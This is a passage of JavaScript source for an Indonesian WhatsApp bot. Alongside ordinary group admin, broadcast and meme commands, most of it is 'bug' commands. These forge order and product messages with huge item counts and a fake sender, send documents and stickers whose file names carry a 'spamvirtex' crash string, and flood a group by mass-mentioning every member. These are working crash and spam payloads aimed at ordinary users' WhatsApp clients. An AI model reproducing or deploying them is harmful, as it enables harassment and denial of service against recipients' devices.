zoe.sendMessage(from, wew, image, {thumbnail:fs.readFileSync(`hm/vvirgamv2.jpeg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`hm/vvirgamv2.jpeg`),"itemCount":999999999,"status":"INQUIRY","surface":"CATALOG","message":` BODY `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},caption: lzain,contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
python = fs.readFileSync(`./logo1.jpg`)
imeu = await zoe.prepareMessage('0@s.whatsapp.net', python, image)

imeg = imeu.message.imageMessage
res = await zoe.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": emoji2(prefix),
"description": ngazap(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "628956060596467@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  zoe.relayWAMessage(res)
 await zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
 zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
 break
					case 'add':
					if (!dev.key.fromMe) return reply('Lu siapa')
					if (!isGroup) return reply(groupo())
					if (!isGroupAdmins) return reply(admin())
				if (args.length < 1) return reply('Yang mau di add siapa??')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						zoe.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
					case 'demote':
					if (!dev.key.fromMe) return reply('Lu siapa')
					if (!isGroup) return reply(groupo())
					if (!isGroupAdmins) return reply(admin())
					if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('*Tag target yang ingin di turunkan admin group!*')
					mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `*Perintah diterima, menurunkan jadi admin group* :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						zoe.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`*Perintah diterima, menurunkan* @${mentioned[0].split('@')[0]} *jadi admin group*`, mentioned, true)
						zoe.groupDemoteAdmin(from, mentioned)
					}
					break
case 'bc':
if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
if (args.length < 1) return reply('.......')
anu = await zoe.chats.all()
if (isMedia && !dev.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
bc = await zoe.downloadMediaMessage(encmedia)
for (let _ of anu) {
zoe.sendMessage(_.jid, bc, image, { caption: `[ Izin Broadcast ]\n\n${body.slice(4)}` })
}
reply('Suksess broadcast')
} else {
for (let _ of anu) {
sendMess(_.jid, `[ *BOT BROADCAST* ]\n\n${body.slice(4)}`)
}
reply('Suksess broadcast')
}
break
case 'bcnowm': 
        if (!dev.key.fromMe) return reply('lu siapa??')
if (!q)return reply(`Reply image , video , atau teks biasa dan Masukan Ingfo`)
bcc = await zoe.chats.all()
if (isMedia && !dev.message.imageMessage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
let media = await zoe.downloadMediaMessage(encmedia)
for (let i of bcc){
zoe.sendMessage(i.jid, media, image, {contextInfo: { forwardingScore: 9999, isForwarded:true},caption: `${q}`})
}
reply(`Sukses`)
} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mem).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
bc = await zoe.downloadMediaMessage(encmedia)
for (let _ of bcc) {
zoe.sendMessage(_.jid, bc, video, {caption: `${q}`})
}
reply('Suksess broadcast')
}	else {
for (let _ of bcc) {
sendMess(_.jid, `${q}`)
	}
reply(`Succses BroadCast ${totalchat.length} Total chat`)
		}
break			   
			case 'promote':
			if (!dev.key.fromMe) return reply('Lu siapa')
					if (!isGroup) return reply(groupo())
					if (!isGroupAdmins) return reply(admin())
					if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('*Tag target yang ingin di jadikan admin group!*')
					mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `*Selamat* 🥳 *Anda naik menjadi admin group* 🎉 :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						zoe.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`*Selamat* 🥳 @${mentioned[0].split('@')[0]} *Anda naik menjadi admin group* 🎉`, mentioned, true)
						zoe.groupMakeAdmin(from, mentioned)
					}
					break
					case 'group':
if (!dev.key.fromMe) return reply('Lu siapa')
if (!isGroupAdmins) return reply('No admin dev')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
if (args[0] === 'buka') {
zoe.groupSettingChange(from, GroupSettingChange.messageSend, false)
reply(`Sukses membuka akses grup ${groupName}`)
} else if (args[0] === 'tutup') {
zoe.groupSettingChange(from, GroupSettingChange.messageSend, true)
reply(`Sukses menutup akses ${groupName}`)
}
break
						case 'owner':
                  case 'creator':
                  zoe.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: dev})
                  zoe.sendMessage(from, 'Tuh nomer owner ku',MessageType.text, { quoted: dev} )
					break    
				  case 'lirik':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
            case 'kick':
            if (!dev.key.fromMe) return reply('Lu siapa')
					if (!isGroup) return reply(groupo())
					if (!isGroupAdmins) return reply(admin())
						if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 ??𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `╔────────────────⊱
║> *_ASEK DAPAT JATAH OPEN BO.KICK_*
╰────────────────⊱
 🤭 :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						zoe.groupRemove(from, mentioned)
					} else {
						mentions(`╔────────────────⊱
║> *_ASEK DAPAT JATAH OPEN BO.KICK_*
╰────────────────⊱
 @${mentioned[0].split('@')[0]} 🤭`, mentioned, true)
						zoe.groupRemove(from, mentioned)
					}
					break
case 'jadiphilips':
if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.txt`, mimetype: 'application/txt'})
}
break
case 'jadiphilipsv2':
if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.txt`, mimetype: 'application/txt'})
}
break
case 'jadibugpdf':
if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.pdf`, mimetype: 'application/pdf'})
}
break
case 'jadibugpdfv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !dev.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.pdf`, mimetype: 'application/pdf'})
}
break
				case 'jadibugjs':
if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.js`, mimetype: 'application/js'})
}
break
case 'jadibugjsv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !dev.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.js`, mimetype: 'application/js'})
}
break
case 'jadibugjson':
if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.json`, mimetype: 'application/json'})
}
break
case 'jadibugjsonv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !dev.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.json`, mimetype: 'application/json'})
}
break
case 'jadibugxml':
if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.xml`, mimetype: 'application/xml'})
}
break
case 'jadibugxmlv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !dev.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.xml`, mimetype: 'application/xml'})
}
break
case 'jadibugzip':
if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.zip`, mimetype: 'application/zip'})
}
break
case 'jadibugzipv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !dev.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.zip`, mimetype: 'application/zip'})
}
break
case 'jadibug7z':
if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.7z`, mimetype: 'application/x-7z-compressed'})
}
break
case 'jadibug7zv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !dev.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.7z`, mimetype: 'application/x-7z-compressed'})
}
break
case 'jadibugdoc':
case 'jadibugdok':
if (!q) return reply(`Teks?`)
         if (!dev.key.fromMe && !isOwner) return
arawa = fs.readFileSync('./src/arawa.txt')
zoe.sendMessage(from, arawa, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'zoe️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${q}                                                                          ${spamvirtex}.txt`, mimetype: 'application/txt'})
break
case 'smeme':
pe = args.join('')
            top = pe.split('|')[0]
            bottom = pe.split('|')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
owgi = await  zoe.downloadAndSaveMediaMessage(ger)
anu = await imgbb("20a14861e4f7591f3dc52649cb07ae02", owgi)
tekks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${tekks}`
sendStickerFromUrl(from, `${anu1}`)
} else {
reply(`Gunakan foto/stiker!\n Contoh ${prefix}smeme Kontol Masuk|Memek`)
}
break
case 'certificateff':
if (!q) return reply(`Teks?`)
                   reply(`Sbntr`)
                   montok = await getBuffer(`https://sertiojanganzapi.nasihosting.com/serti/serti1/img.php?nama=${q}`)
                   zoe.sendMessage(from, montok, image, {caption: `Nih Ngabbbbbb `, quoted: dev})
                   break
case 'magma':
if(!q)return reply(`Cara Makeknya, Pertama Reply Stikernya, Kedua ketik : ${prefix + command} Text1|Text2`)
                   reply(`Sbntr`)
                   avengers = await fetchJson(`https://yuzzu-api.herokuapp.com/api/textpro/magma?text=${q}`)
                   buffer = await getBuffer(avengers.result)
                   zoe.sendMessage(from, buffer, image, {caption: `Nih Ngabbbbbb `, quoted: dev})
                   break
case 'pipaair':
if(!q)return reply(`Cara Makeknya, Pertama Reply Stikernya, Kedua ketik : ${prefix + command} Text1|Text2`)
                   reply(`Sbntr`)
                   avengers = await fetchJson(`https://yuzzu-api.herokuapp.com/api/textpro/waterpipe?text=${q}`)
                   buffer = await getBuffer(avengers.result)
                   zoe.sendMessage(from, buffer, image, {caption: `Nih Ngabbbbbb `, quoted: dev})
                   break
case 'ahageo':
                   reply(`Sbntr`)
                   avengers = await fetchJson(`https://yuzzu-api.herokuapp.com/api/nsfw/ahegao`)
                   buffer = await getBuffer(avengers.result)
                   zoe.sendMessage(from, buffer, image, {caption: `Nih Ngabbbbbb `, quoted: dev})
                   break
case 'bugbutton':
				if (!dev.key.fromMe) return reply('Lu siapa')
const ahageo = `${zoemods}`
const sasageo = `${zoemods}`
		sendButLocation(from, `YT : Zextz High7 \n${spamvirtex}`, 'https://youtu.be/QShjlsC5-wc', {thumbnail: virgam}, [{buttonId:`${prefix}command`,buttonText:{displayText: `${ahageo}`},type:1},{buttonId:`${prefix}id10`,buttonText:{displayText: `${ahageo}`},type:1},{buttonId:`${prefix}id2`,buttonText:{displayText:`${ahageo}`},type:1}], {contextInfo: { mentionedJid: [senderr, `${nomerOwner}` + '@s.whatsapp.net']}})
break
case 'bugtrolilist':
if (!dev.key.fromMe) return reply('Lu siapa')
zoe.toggleDisappearingMessages(from, 9999)
res = await zoe.prepareMessageFromContent(from,{
"listMessage": {
"title": 'BODY-BOT〽️️',
"description": `zoe                                             ${spamvirtex}`,
"buttonText": "𖥂 🎭 𖥂️",
"listType": "SINGLE_SELECT",
 "thumbnail": virgam,
"sections": [
{
    "rows": [ 
       {
          "title": `MEMK`,
          "rowId": "Yyyy"
       }  
     ]
   }
 ]
}
}, {quoted: dev})
zoe.relayWAMessage(res)
break
case 'coba':
if (!dev.key.fromMe) return reply('Lu siapa om')
reply('update..')
break
case 'virtag':  
if (!dev.key.fromMe) return reply('Lu siapa')
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `${virtag(prefix)}`
					for (let mem of groupMembers) {
						teks += ` 
					    @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}   @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} 